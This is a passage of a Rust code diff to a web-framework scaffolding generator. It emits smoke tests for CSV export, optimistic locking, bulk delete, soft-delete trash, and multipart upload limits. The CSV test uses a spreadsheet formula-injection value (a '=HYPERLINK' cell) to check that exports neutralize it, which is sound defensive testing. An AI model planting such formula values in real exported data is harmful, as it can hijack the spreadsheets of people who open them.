+         /// the order `src/routes/{plural}.rs`'s `CsvSchema` impl lists them.\n    \
+         /// `None` is a NULL column.\n    \
+         struct ExportRow {{\n        \
+         id: i64,\n        \
+         cells: Vec<Option<String>>,\n    \
+         }}\n\n    \
+         impl autumn_web::data::csv::CsvSchema for ExportRow {{\n        \
+         fn csv_columns() -> &'static [&'static str] {{\n            \
+         &[{columns}]\n        \
+         }}\n\n        \
+         fn to_csv_record(&self) -> Vec<String> {{\n            \
+         let mut record = vec![self.id.to_string()];\n            \
+         record.extend(\n                \
+         self.cells\n                    \
+         .iter()\n                    \
+         .map(|cell| csv_text_cell(cell.clone().unwrap_or_default())),\n            \
+         );\n            \
+         record\n        \
+         }}\n    \
+         }}\n\n    \
+         #[get(\"/{plural}/export.csv\")]\n    \
+         async fn export_csv() -> AutumnResult<autumn_web::download::Download> {{\n        \
+         let rows = vec![\n            \
+         ExportRow {{ id: 1, cells: vec![{filled_cells}] }},\n            \
+         ExportRow {{ id: 2, cells: vec![{quoting_cells}] }},\n            \
+         ExportRow {{ id: 3, cells: vec![{formula_cells}] }},\n        \
+         ];\n        \
+         let mut body: Vec<u8> = Vec::new();\n        \
+         autumn_web::data::csv::export_csv(rows, &mut body)?;\n        \
+         Ok(autumn_web::download::Download::from_bytes(body).filename(\"{plural}.csv\"))\n    \
+         }}\n\n    \
+         let client: TestClient = TestApp::new().routes(routes![export_csv]).build();\n    \
+         let response = client.get(\"/{plural}/export.csv\").send().await;\n    \
+         response\n        \
+         .assert_ok()\n        \
+         .assert_header_contains(\"content-type\", \"text/csv\")\n        \
+         .assert_header_contains(\"content-disposition\", \"attachment\")\n        \
+         .assert_header_contains(\"content-disposition\", \"filename=\\\"{plural}.csv\\\"\")\n        \
+         // The header row is the model's columns, in `csv_columns` order.\n        \
+         .assert_body_contains(\"{header_row}\");\n\n    \
+         let body = response.text();\n    \
+         // Rows 2 and 3 carry NULL cells: those are EMPTY, never the literal\n    \
+         // `None` a debug format would print.\n    \
+         assert!(\n        \
+         !body.contains(\"None\"),\n        \
+         \"a NULL column must export as an empty cell, not `None`:\\n{{body}}\"\n    \
+         );\n    \
+         // RFC 4180: an embedded double quote is doubled and the whole field is\n    \
+         // quoted, so a comma or newline inside it never splits the row.\n    \
+         assert!(\n        \
+         body.contains(\"\\\"\\\"q\\\"\\\"\"),\n        \
+         \"a value containing a quote must be RFC 4180 escaped:\\n{{body}}\"\n    \
+         );\n    \
+         // A leading `=` is neutralized, so a spreadsheet shows the text instead\n    \
+         // of executing it against the rest of the sheet.\n    \
+         assert!(\n        \
+         body.contains(\"'=HYPERLINK\"),\n        \
+         \"a formula-looking value must be prefixed so the sheet treats it as text:\\n{{body}}\"\n    \
+         );\n\
+         }}\n"
+    )
+}
+
 /// Render the write-path portion of `tests/<snake>.rs` (issue #1127): one
 /// in-process `#[tokio::test]` that exercises the full mutating surface —
 /// create (happy path), update, delete, AND the validation-failure re-render —
@@ -5861,8 +11521,158 @@ fn render_validation_rejection_smoke_test(
 /// `form_for`-rendered forms (PR #1587) auto-inject a hidden CSRF field for the
 /// browser; the in-process harness does not require it, and this comment
 /// records that so the absent token reads as intentional, not a gap.
+/// Render the optimistic-locking stale-write test (issue #1318, AC6).
+///
+/// Emitted only for a scaffold whose model declares `lock_version`, alongside
+/// [`render_write_path_smoke_test`] and in the same in-process style: a
+/// process-local store stands in for the persistence layer, so it runs with no
+/// database and is a visible green rather than an `#[ignore]`d one.
+///
+/// The stand-in `update` mirrors the generated handler's contract — a
+/// compare-and-swap on the submitted version, a 409 re-render carrying the
+/// author's own input plus the row's CURRENT version, and a version bump only on
+/// the winning write:
+///
+/// * a submit carrying a stale version responds 409, re-renders the author's
+///   input, and leaves the stored row EXACTLY as the other writer left it;
+/// * a submit carrying the current version redirects (303) and bumps the
+///   version, so the next stale submit is rejected against the new value.
+///
+/// The 409 body hands back the fresh version deliberately: re-rendering the
+/// stale one would make the form permanently unsavable, since every resubmit
+/// would lose the same race again.
+///
+/// SCOPE, stated plainly: like every #1127-style generated test this exercises
+/// the *request mechanism* against a stand-in, not the app's own handler (a
+/// `tests/*.rs` binary cannot import a binary crate's modules). It pins the
+/// contract a reader can then hold the handler to; it does NOT fail if the
+/// emitted `WHERE lock_version = ...` guard is removed. Two other tests cover
+/// that: `lock_version_update_guards_the_write_and_bumps_the_version` in the
+/// generator's own suite asserts the emitted statement, and
+/// `autumn-cli/tests/integration/generate_lock_version_postgres.rs` runs the
+/// generated migration and statement against real Postgres — including two
+/// concurrent transactions — to prove the semantics.
+fn render_optimistic_lock_smoke_test(plural: &str) -> String {
+    const TEMPLATE: &str = r#"
+
+// -- optimistic locking: stale write is rejected (issue #1318) --------------
+//
+// Two authors open the same row; the second one to save must not silently
+// clobber the first. Exercises the generated update handler's contract against
+// a stand-in resource: compare-and-swap on the submitted `lock_version`, a 409
+// re-render (never a redirect, never a dead-end error page) when it is stale,
+// and a version bump only on the write that wins.
+#[tokio::test]
+async fn __PLURAL___optimistic_lock_conflict() {
+    use autumn_web::test::{TestApp, TestClient};
+
+    // `(id, name, lock_version)` — the process-local stand-in for the row.
+    static ROW: std::sync::Mutex<(i64, String, i32)> =
+        std::sync::Mutex::new((1, String::new(), 0));
+
+    #[get("/__PLURAL__/{id}")]
+    async fn show(id: Path<i64>) -> Markup {
+        let _ = id;
+        let row = ROW.lock().unwrap();
+        html! { p { "name=" (row.1.as_str()) " lock_version=" (row.2) } }
+    }
+
+    #[post("/__PLURAL__/{id}/update")]
+    async fn update(id: Path<i64>, body: autumn_web::reexports::axum::body::Bytes) -> impl IntoResponse {
+        let expected: i32 = url::form_urlencoded::parse(body.as_ref())
+            .find(|(key, _)| key == "lock_version")
+            .and_then(|(_, value)| value.parse().ok())
+            .unwrap_or(-1);
+        let submitted: String = url::form_urlencoded::parse(body.as_ref())
+            .find(|(key, _)| key == "name")
+            .map(|(_, value)| value.into_owned())
+            .unwrap_or_default();
+
+        let mut row = ROW.lock().unwrap();
+        // Compare-and-swap, exactly like the generated
+        // `WHERE lock_version = $expected ... SET lock_version = lock_version + 1`.
+        if row.2 != expected {
+            // Stale: re-render the author's own input with the CURRENT version,
+            // so a second Save applies their edit on top of the newer row.
+            return (
+                StatusCode::CONFLICT,
+                html! {
+                    p role="alert" { "This record was changed by someone else since you opened it." }
+                    input type="hidden" name="lock_version" value=(row.2);
+                    input type="text" name="name" value=(submitted.as_str());
+                },
+            )
+                .into_response();
+        }
+        row.1 = submitted;
+        row.2 += 1;
+        Redirect::to(&format!("/__PLURAL__/{}", *id)).into_response()
+    }
+
+    let client: TestClient = TestApp::new().routes(routes![show, update]).build();
+
+    // Both authors opened the row at version 0. The first save wins: 303 to the
+    // show page, and the version is bumped to 1.
+    client
+        .post("/__PLURAL__/1/update")
+        .form("name=first-author&lock_version=0")
+        .send()
+        .await
+        .assert_status(303)
+        .assert_header("location", "/__PLURAL__/1");
+    client
+        .get("/__PLURAL__/1")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("name=first-author")
+        .assert_body_contains("lock_version=1");
+
+    // The second author still holds version 0. Their save is rejected with a
+    // 409 re-render that keeps what they typed and carries the row's CURRENT
+    // version, so the next Save can succeed instead of losing forever.
+    client
+        .post("/__PLURAL__/1/update")
+        .form("name=second-author&lock_version=0")
+        .send()
+        .await
+        .assert_status(409)
+        .assert_body_contains("changed by someone else")
+        .assert_body_contains("second-author")
+        .assert_body_contains("value=\"1\"");
+
+    // The stale submit changed nothing: the first author's value and the
+    // version they produced both stand.
+    client
+        .get("/__PLURAL__/1")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("name=first-author")
+        .assert_body_contains("lock_version=1");
+
+    // Re-submitting against the version the 409 handed back succeeds and bumps
+    // again — the conflict is recoverable, not a dead end.
+    client
+        .post("/__PLURAL__/1/update")
+        .form("name=second-author&lock_version=1")
+        .send()
+        .await
+        .assert_status(303);
+    client
+        .get("/__PLURAL__/1")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("name=second-author")
+        .assert_body_contains("lock_version=2");
+}
+"#;
+    TEMPLATE.replace("__PLURAL__", plural)
+}
+
 #[allow(clippy::too_many_lines)] // the emitted test body is one raw-string template
-fn render_write_path_smoke_test(pascal_name: &str, plural: &str) -> String {
+fn render_write_path_smoke_test(pascal_name: &str, plural: &str, bulk_delete: bool) -> String {
     const TEMPLATE: &str = r#"
 // ── write-path CRUD (issue #1127) ─────────────────────────────────────────
 //
@@ -5936,10 +11746,10 @@ async fn __PLURAL___write_path_crud() {
     async fn destroy(id: Path<i64>) -> impl IntoResponse {
         STORE.lock().unwrap().retain(|(i, _)| *i != *id);
         Redirect::to("/__PLURAL__")
-    }
+    }__BULK_HANDLER__
 
     let client: TestClient = TestApp::new()
-        .routes(routes![index, create, update, destroy])
+        .routes(routes![index, create, update, destroy__BULK_ROUTE__])
         .build();
 
     // Create (happy path): a valid POST redirects (303 See Other) to the index
@@ -6005,6 +11815,298 @@ async fn __PLURAL___write_path_crud() {
         .get("/__PLURAL__")
         .send()
         .await
+        .assert_body_contains("0 row(s)");__BULK_STEPS__
+}
+"#;
+    // Issue #1312: the bulk delete-selected stand-in. Mirrors the generated
+    // handler's contract — repeated `ids` checkboxes, 303 back to the index, and
+    // an empty selection that is a no-op rather than a 400.
+    const BULK_HANDLER: &str = r#"
+
+    // Issue #1312: the index list's bulk form posts the checked rows here as
+    // repeated `ids` pairs. Malformed values are dropped and an empty selection
+    // is a no-op — a list-write endpoint never 400s on bad params.
+    #[post("/__PLURAL__/bulk_delete")]
+    async fn bulk_delete(
+        body: autumn_web::reexports::axum::body::Bytes,
+    ) -> impl IntoResponse {
+        let mut ids: Vec<i64> = Vec::new();
+        for (key, value) in url::form_urlencoded::parse(body.as_ref()) {
+            if (key == "ids" || key == "ids[]")
+                && let Ok(id) = value.parse::<i64>()
+                && !ids.contains(&id)
+            {
+                ids.push(id);
+            }
+        }
+        STORE.lock().unwrap().retain(|(i, _)| !ids.contains(i));
+        Redirect::to("/__PLURAL__")
+    }"#;
+    const BULK_STEPS: &str = r#"
+
+    // Bulk delete (issue #1312): re-seed two rows, then submit both ids the way
+    // the generated list's checkboxes do (`ids=1&ids=2`). One POST removes both
+    // and redirects (303) to the index.
+    for name in ["bulk-one", "bulk-two"] {
+        client
+            .post("/__PLURAL__")
+            .form(&format!("name={name}&witness=w"))
+            .send()
+            .await
+            .assert_status(303);
+    }
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_body_contains("2 row(s)");
+    client
+        .post("/__PLURAL__/bulk_delete")
+        .form("ids=1&ids=2")
+        .send()
+        .await
+        .assert_status(303)
+        .assert_header("location", "/__PLURAL__");
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_body_contains("0 row(s)");
+
+    // An empty selection is a 303 no-op, NOT a 400: nothing was checked, so
+    // nothing is deleted and the visitor lands back on the list.
+    client
+        .post("/__PLURAL__/bulk_delete")
+        .form("")
+        .send()
+        .await
+        .assert_status(303)
+        .assert_header("location", "/__PLURAL__");
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_body_contains("0 row(s)");"#;
+    TEMPLATE
+        .replace(
+            "__BULK_HANDLER__",
+            if bulk_delete { BULK_HANDLER } else { "" },
+        )
+        .replace(
+            "__BULK_ROUTE__",
+            if bulk_delete { ", bulk_delete" } else { "" },
+        )
+        .replace("__BULK_STEPS__", if bulk_delete { BULK_STEPS } else { "" })
+        .replace("__PASCAL__", pascal_name)
+        .replace("__PLURAL__", plural)
+}
+
+/// Render the trash / restore / purge lifecycle smoke test (issue #1332, AC7).
+///
+/// Emitted alongside [`render_write_path_smoke_test`] for every `--soft-delete`
+/// scaffold that gets the trash surface, and follows the same #1127 in-process
+/// style: a process-local stand-in for the persistence layer, so it runs green
+/// without Docker (unlike the `TestDb`-backed index smoke test, which is
+/// `#[ignore]`d).
+///
+/// The stand-in's `deleted` flag plays the part of the `deleted_at` column
+/// `--soft-delete` adds, and each handler mirrors its generated counterpart's
+/// contract: the index hides trashed rows, the trash page shows only those,
+/// restore/purge refuse a row that is not in the trash (the generated handlers'
+/// `deleted_at IS NOT NULL` guard load), and every write redirects with 303.
+#[allow(clippy::too_many_lines)] // the emitted test body is one raw-string template
+fn render_trash_lifecycle_smoke_test(pascal_name: &str, plural: &str) -> String {
+    const TEMPLATE: &str = r#"
+// ── trash / restore / purge lifecycle (issue #1332) ───────────────────────
+//
+// The full recover-from-trash flow in one in-process test against a stand-in
+// resource: create -> delete (soft) -> present in Trash and absent from the
+// index -> restore -> back in the index and out of Trash -> purge -> gone from
+// both. `TestApp::new()` disables CSRF, so these same-origin form POSTs need no
+// `_csrf` token (the generated trash view injects one for the browser).
+//
+// The handlers are stand-ins, not the generated `routes::__PLURAL__` ones: a
+// `tests/` binary cannot import a project's own code when the project has no
+// `src/lib.rs` (see `docs/guide/tutorial/11-testing.md`).
+#[tokio::test]
+async fn __PLURAL___trash_restore_purge_lifecycle() {
+    use autumn_web::test::{TestApp, TestClient};
+
+    // `(id, title, deleted)` rows shared across requests within this test. The
+    // `deleted` flag stands in for the `deleted_at` timestamp column.
+    static TRASH_STORE: std::sync::Mutex<Vec<(i64, String, bool)>> =
+        std::sync::Mutex::new(Vec::new());
+
+    // The index hides trashed rows, exactly as the soft-delete repository's
+    // `deleted_at IS NULL` filter does for the generated `index`.
+    #[get("/__PLURAL__")]
+    async fn index() -> Markup {
+        let store = TRASH_STORE.lock().unwrap();
+        let live: Vec<&(i64, String, bool)> = store.iter().filter(|row| !row.2).collect();
+        html! {
+            h1 { "__PASCAL__s" }
+            p { (live.len()) " row(s)" }
+            ul { @for row in &live { li { (row.1.as_str()) } } }
+        }
+    }
+
+    // The trash page is the mirror image: only the rows the delete button
+    // marked deleted, which is what `only_deleted` returns.
+    #[get("/__PLURAL__/trash")]
+    async fn trash() -> Markup {
+        let store = TRASH_STORE.lock().unwrap();
+        let deleted: Vec<&(i64, String, bool)> = store.iter().filter(|row| row.2).collect();
+        html! {
+            h1 { "__PASCAL__ trash" }
+            p { (deleted.len()) " trashed" }
+            ul { @for row in &deleted { li { (row.1.as_str()) } } }
+        }
+    }
+
+    #[post("/__PLURAL__")]
+    async fn create(body: autumn_web::reexports::axum::body::Bytes) -> impl IntoResponse {
+        let title = autumn_web::form::field_from_urlencoded(&body, "title").unwrap_or_default();
+        let mut store = TRASH_STORE.lock().unwrap();
+        let id = store.iter().map(|row| row.0).max().unwrap_or(0) + 1;
+        store.push((id, title, false));
+        Redirect::to("/__PLURAL__")
+    }
+
+    // Soft delete: mark the row instead of dropping it, matching the generated
+    // `destroy` under `--soft-delete`.
+    #[post("/__PLURAL__/{id}/delete")]
+    async fn destroy(id: Path<i64>) -> impl IntoResponse {
+        let mut store = TRASH_STORE.lock().unwrap();
+        for row in store.iter_mut().filter(|row| row.0 == *id) {
+            row.2 = true;
+        }
+        Redirect::to("/__PLURAL__")
+    }
+
+    #[post("/__PLURAL__/{id}/restore")]
+    async fn restore(id: Path<i64>) -> impl IntoResponse {
+        let mut store = TRASH_STORE.lock().unwrap();
+        // The generated handler loads its row with `deleted_at IS NOT NULL`, so
+        // a row that is not in the trash cannot be restored from it.
+        let Some(row) = store.iter_mut().find(|row| row.0 == *id && row.2) else {
+            return StatusCode::NOT_FOUND.into_response();
+        };
+        row.2 = false;
+        Redirect::to("/__PLURAL__/trash").into_response()
+    }
+
+    #[post("/__PLURAL__/{id}/purge")]
+    async fn purge(id: Path<i64>) -> impl IntoResponse {
+        let mut store = TRASH_STORE.lock().unwrap();
+        // Same guard: purge is the only hard delete, and it must never reach a
+        // row that was not soft-deleted first.
+        if !store.iter().any(|row| row.0 == *id && row.2) {
+            return StatusCode::NOT_FOUND.into_response();
+        }
+        store.retain(|row| row.0 != *id);
+        Redirect::to("/__PLURAL__/trash").into_response()
+    }
+
+    let client: TestClient = TestApp::new()
+        .routes(routes![index, trash, create, destroy, restore, purge])
+        .build();
+
+    // Create: the row is live and listed on the index.
+    client
+        .post("/__PLURAL__")
+        .form("title=recoverable")
+        .send()
+        .await
+        .assert_status(303);
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("recoverable")
+        .assert_body_contains("1 row(s)");
+
+    // Delete (soft): the row leaves the index and turns up in the trash.
+    client
+        .post("/__PLURAL__/1/delete")
+        .send()
+        .await
+        .assert_status(303);
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("0 row(s)");
+    client
+        .get("/__PLURAL__/trash")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("recoverable")
+        .assert_body_contains("1 trashed");
+
+    // Restore: back in the index, gone from the trash.
+    client
+        .post("/__PLURAL__/1/restore")
+        .send()
+        .await
+        .assert_status(303)
+        .assert_header("location", "/__PLURAL__/trash");
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("recoverable")
+        .assert_body_contains("1 row(s)");
+    client
+        .get("/__PLURAL__/trash")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("0 trashed");
+
+    // A live row is not in the trash, so neither recovery action can touch it.
+    client
+        .post("/__PLURAL__/1/restore")
+        .send()
+        .await
+        .assert_status(404);
+    client
+        .post("/__PLURAL__/1/purge")
+        .send()
+        .await
+        .assert_status(404);
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_body_contains("1 row(s)");
+
+    // Purge: soft-delete first, then permanently remove — gone from both views.
+    client
+        .post("/__PLURAL__/1/delete")
+        .send()
+        .await
+        .assert_status(303);
+    client
+        .post("/__PLURAL__/1/purge")
+        .send()
+        .await
+        .assert_status(303)
+        .assert_header("location", "/__PLURAL__/trash");
+    client
+        .get("/__PLURAL__/trash")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("0 trashed");
+    client
+        .get("/__PLURAL__")
+        .send()
+        .await
+        .assert_ok()
         .assert_body_contains("0 row(s)");
 }
 "#;
@@ -6030,28 +12132,78 @@ async fn __PLURAL___write_path_crud() {
 /// project's own routes) that runs the SAME blob path the generated `create`
 /// handler runs.
 #[allow(clippy::too_many_lines)] // the emitted test body is one raw-string template
-fn render_attachment_multipart_write_path_smoke_test(plural: &str, fields: &[Field]) -> String {
+fn render_attachment_multipart_write_path_smoke_test(
+    pascal_name: &str,
+    plural: &str,
+    fields: &[Field],
+) -> String {
     const TEMPLATE: &str = r#"
 
-// ── multipart attachment write-path (issue #1236, AC6) ─────────────────────
+// ── multipart attachment write-path (issue #1236) ──────────────────────────
 //
 // Follows the #1127 in-process write-path style (a process-local stand-in for
-// the persistence layer, no database required, so it runs without Docker): a
-// zero-JS `multipart/form-data` create drives the REAL `Multipart` extractor
-// and the REAL `save_to_blob_store` against a REAL `LocalBlobStore`, binds the
-// returned `Blob` on the record, and asserts the persisted record's attachment
-// column holds a non-empty blob key AND that the uploaded bytes actually landed
-// in the store at that key. The handler is an in-test stand-in (a `tests/`
-// binary cannot import the project's own routes) that runs the SAME blob path
-// the generated `create` handler runs. `TestApp::new()` disables CSRF, so the
-// hand-built body carries no `_csrf` part (the real prod form injects one).
+// the persistence layer, no database required, so these run without Docker):
+// a zero-JS `multipart/form-data` create drives the REAL `Multipart` extractor
+// and the REAL `save_to_blob_store` against a REAL `LocalBlobStore`. The
+// handlers are in-test stand-ins (a `tests/` binary cannot import the
+// project's own routes) running the SAME blob path the generated `create`
+// handler runs. `TestApp::new()` disables CSRF, so the hand-built bodies carry
+// no `_csrf` part (the real form injects one as its first field).
+
+/// A real on-disk blob store for the probes below, plus its root directory so
+/// the caller can remove it when the test finishes.
+fn __PLURAL___probe_blob_store()
+-> (std::sync::Arc<autumn_web::storage::LocalBlobStore>, std::path::PathBuf) {
+    use autumn_web::storage::LocalBlobStore;
+    use autumn_web::storage::local::SigningKey;
+
+    let nanos = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos())
+        .unwrap_or_default();
+    let root = std::env::temp_dir().join(format!("__PLURAL__-blob-probe-{nanos}"));
+    let store = std::sync::Arc::new(
+        LocalBlobStore::new(
+            "test",
+            root.clone(),
+            "/_blobs",
+            std::time::Duration::from_secs(60),
+            SigningKey::new(b"test-signing-key".to_vec()),
+            Vec::new(),
+        )
+        .expect("build local blob store"),
+    );
+    (store, root)
+}
+
+/// A `multipart/form-data` body (boundary `BOUND`) with one text part for a
+/// sibling column and, when `file` is `Some`, one file part for the attachment
+/// column — exactly what a browser submits from the scaffolded form.
+fn __PLURAL___probe_body(file: Option<&str>) -> String {
+    let mut body = String::from(
+        "--BOUND\r\nContent-Disposition: form-data; name=\"__TEXT_FIELD__\"\r\n\r\nhello\r\n",
+    );
+    if let Some(contents) = file {
+        body.push_str(
+            "--BOUND\r\nContent-Disposition: form-data; \
+             name=\"__ATTACH__\"; filename=\"upload.png\"\r\n\
+             Content-Type: image/png\r\n\r\n",
+        );
+        body.push_str(contents);
+        body.push_str("\r\n");
+    }
+    body.push_str("--BOUND--\r\n");
+    body
+}
+
+/// A multipart create stores the file and binds its `Blob` on the record, and
+/// the uploaded bytes really do land in the store at the bound key.
 #[tokio::test]
 async fn __PLURAL___multipart_upload_binds_blob_key() {
-    use autumn_web::storage::local::SigningKey;
-    use autumn_web::storage::{BlobStore, BlobStoreState, LocalBlobStore};
+    use autumn_web::storage::{BlobStore, BlobStoreState};
 
     // Process-local stand-in for the persistence layer: the attachment `Blob`
-    // bound on each created record (mirrors the `New{Pascal}.{attachment}`
+    // bound on each created record (mirrors the `New__PASCAL__.__ATTACH__`
     // column the generated `create` handler sets). No database required.
     static STORE: std::sync::Mutex<Vec<autumn_web::storage::Blob>> =
         std::sync::Mutex::new(Vec::new());
@@ -6082,23 +12234,7 @@ async fn __PLURAL___multipart_upload_binds_blob_key() {
         Ok(Redirect::to("/__PLURAL__"))
     }
 
-    // A real on-disk blob store so `save_to_blob_store` has a backend.
-    let nanos = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .map(|d| d.as_nanos())
-        .unwrap_or_default();
-    let blob_root = std::env::temp_dir().join(format!("__PLURAL__-blob-probe-{nanos}"));
-    let blob_store = std::sync::Arc::new(
-        LocalBlobStore::new(
-            "test",
-            blob_root.clone(),
-            "/_blobs",
-            std::time::Duration::from_secs(60),
-            SigningKey::new(b"test-signing-key".to_vec()),
-            Vec::new(),
-        )
-        .expect("build local blob store"),
-    );
+    let (blob_store, blob_root) = __PLURAL___probe_blob_store();
     let store_handle = blob_store.clone();
 
     let client: TestClient = TestApp::new()
@@ -6108,23 +12244,12 @@ async fn __PLURAL___multipart_upload_binds_blob_key() {
         })
         .build();
 
-    // Hand-built multipart body (TestClient has no `.multipart()` helper): a
-    // text part for a sibling field plus a file part for the attachment field.
-    let body = "--BOUND\r\n\
-Content-Disposition: form-data; name=\"__TEXT_FIELD__\"\r\n\r\n\
-hello\r\n\
---BOUND\r\n\
-Content-Disposition: form-data; name=\"__ATTACH__\"; filename=\"upload.png\"\r\n\
-Content-Type: image/png\r\n\r\n\
-not-an-empty-file\r\n\
---BOUND--\r\n";
-
     // The multipart create succeeds and redirects (303), exactly like the real
     // generated attachment handler.
     client
         .post("/__PLURAL__/upload-probe")
         .header("content-type", "multipart/form-data; boundary=BOUND")
-        .body(body.to_owned())
+        .body(__PLURAL___probe_body(Some("not-an-empty-file")))
         .send()
         .await
         .assert_status(303)
@@ -6156,6 +12281,155 @@ not-an-empty-file\r\n\
 
     let _ = std::fs::remove_dir_all(&blob_root);
 }
+
+/// An upload over `security.upload.max_file_size_bytes` is rejected with `413`
+/// and nothing is left behind in the store. The cap is driven through the real
+/// config knob, not a per-route override, so this also proves the scaffolded
+/// handler honours whatever the app configures.
+#[tokio::test]
+async fn __PLURAL___multipart_upload_over_limit_is_413() {
+    use autumn_web::storage::{BlobStore, BlobStoreState};
+
+    #[post("/__PLURAL__/limit-probe")]
+    async fn create(
+        autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,
+        mut multipart: autumn_web::extract::Multipart,
+    ) -> AutumnResult<Redirect> {
+        let store = state
+            .extension::<BlobStoreState>()
+            .expect("blob store configured")
+            .store()
+            .clone();
+        while let Some(field) = multipart.next_field().await? {
+            if field.name() == Some("__ATTACH__")
+                && field.file_name().is_some_and(|name| !name.is_empty())
+            {
+                field
+                    .save_to_blob_store(&*store, "__PLURAL__/__ATTACH__/over-limit")
+                    .await?;
+            }
+        }
+        Ok(Redirect::to("/__PLURAL__"))
+    }
+
+    let (blob_store, blob_root) = __PLURAL___probe_blob_store();
+    let store_handle = blob_store.clone();
+
+    // Same defaults `TestApp::new()` uses, with a deliberately tiny per-file cap.
+    let mut config = autumn_web::config::AutumnConfig::default();
+    config.profile = Some("test".into());
+    config.security.csrf.enabled = false;
+    config.security.upload.max_file_size_bytes = 16;
+
+    let client: TestClient = TestApp::new()
+        .config(config)
+        .routes(routes![create])
+        .state_initializer(move |state| {
+            state.insert_extension(BlobStoreState::new(blob_store.clone()));
+        })
+        .build();
+
+    client
+        .post("/__PLURAL__/limit-probe")
+        .header("content-type", "multipart/form-data; boundary=BOUND")
+        .body(__PLURAL___probe_body(Some(&"x".repeat(4096))))
+        .send()
+        .await
+        .assert_status(413);
+
+    // Rejected part-way through, the store holds no object at the key: the
+    // backend writes to a temp sibling and unlinks it when the cap trips, so
+    // neither partial bytes nor a `.meta` sidecar survive. (The key's parent
+    // directories are still created, so this asserts on the object, not the
+    // directory tree.)
+    let residue = store_handle
+        .head("__PLURAL__/__ATTACH__/over-limit")
+        .await
+        .expect("head on a missing key reports absence, not an error");
+    assert!(
+        residue.is_none(),
+        "a rejected oversized upload must leave no object behind: {residue:?}"
+    );
+
+    let _ = std::fs::remove_dir_all(&blob_root);
+}
+
+/// Submitting the form with no file selected succeeds and leaves the optional
+/// attachment column NULL — the empty file input a browser sends must not be
+/// mistaken for an upload.
+#[tokio::test]
+async fn __PLURAL___multipart_create_without_file_is_null() {
+    use autumn_web::storage::BlobStoreState;
+
+    static STORE: std::sync::Mutex<Vec<Option<autumn_web::storage::Blob>>> =
+        std::sync::Mutex::new(Vec::new());
+
+    #[post("/__PLURAL__/null-probe")]
+    async fn create(
+        autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,
+        mut multipart: autumn_web::extract::Multipart,
+    ) -> AutumnResult<Redirect> {
+        let store = state
+            .extension::<BlobStoreState>()
+            .expect("blob store configured")
+            .store()
+            .clone();
+        let mut __ATTACH___blob: Option<autumn_web::storage::Blob> = None;
+        while let Some(field) = multipart.next_field().await? {
+            if field.name() == Some("__ATTACH__")
+                && field.file_name().is_some_and(|name| !name.is_empty())
+            {
+                __ATTACH___blob = Some(
+                    field
+                        .save_to_blob_store(&*store, "__PLURAL__/__ATTACH__/unused")
+                        .await?,
+                );
+            }
+        }
+        // Mirrors `new.__ATTACH__ = __ATTACH___blob;` in the generated handler.
+        STORE.lock().unwrap().push(__ATTACH___blob);
+        Ok(Redirect::to("/__PLURAL__"))
+    }
+
+    let (blob_store, blob_root) = __PLURAL___probe_blob_store();
+
+    let client: TestClient = TestApp::new()
+        .routes(routes![create])
+        .state_initializer(move |state| {
+            state.insert_extension(BlobStoreState::new(blob_store.clone()));
+        })
+        .build();
+
+    // A browser submitting the form with nothing chosen sends an empty file
+    // part; assert the stricter case too by sending no file part at all.
+    for body in [
+        __PLURAL___probe_body(None),
+        "--BOUND\r\nContent-Disposition: form-data; \
+         name=\"__ATTACH__\"; filename=\"\"\r\n\r\n\r\n--BOUND--\r\n"
+            .to_owned(),
+    ] {
+        client
+            .post("/__PLURAL__/null-probe")
+            .header("content-type", "multipart/form-data; boundary=BOUND")
+            .body(body)
+            .send()
+            .await
+            .assert_status(303);
+
+        let bound = STORE
+            .lock()
+            .unwrap()
+            .last()
+            .cloned()
+            .expect("a record was created");
+        assert!(
+            bound.is_none(),
+            "the optional attachment column must stay NULL when no file is submitted, got: {bound:?}"
+        );
+    }
+
+    let _ = std::fs::remove_dir_all(&blob_root);
+}
 "#;
     let attach = fields
         .iter()
@@ -6168,6 +12442,7 @@ not-an-empty-file\r\n\
         .find(|f| !f.kind.is_attachment())
         .map_or("note", |f| f.name.as_str());
     TEMPLATE
+        .replace("__PASCAL__", pascal_name)
         .replace("__PLURAL__", plural)
         .replace("__ATTACH__", attach)
         .replace("__TEXT_FIELD__", text_field)
@@ -6310,8 +12585,24 @@ fn sql_sample_literal(kind: FieldKind) -> String {
         // special-cases every enum column (the field under test gets the
         // deliberately out-of-set literal; any *other* required enum column
         // gets one of its own real variants instead — see that function).
-        FieldKind::String | FieldKind::Text | FieldKind::Enum => "'sample'".to_owned(),
-        FieldKind::I32 | FieldKind::I64 | FieldKind::References => "1".to_owned(),
+        FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Enum => {
+            "'sample'".to_owned()
+        }
+        // A unique sample literal, not `'sample'` — this helper fills every
+        // *other* `NOT NULL` column while testing one column in isolation, and
+        // a slug field's own `UNIQUE INDEX` would reject a second `'sample'`
+        // row alongside whatever `enum_rejection_insert_sql` inserts.
+        FieldKind::Slug => "'sample-slug'".to_owned(),
+        // `position` (issue #1358) is a plain `BIGINT NOT NULL` column like
+        // any other `i64`-shaped field — "1" satisfies it fine for a smoke
+        // test that isn't exercising the ordering invariant itself.
+        // `commentable` (issue #1367) is likewise a plain `BIGINT NOT NULL`
+        // counter column at the storage level.
+        FieldKind::I32
+        | FieldKind::I64
+        | FieldKind::References
+        | FieldKind::Position
+        | FieldKind::Commentable => "1".to_owned(),
         FieldKind::Bool => "TRUE".to_owned(),
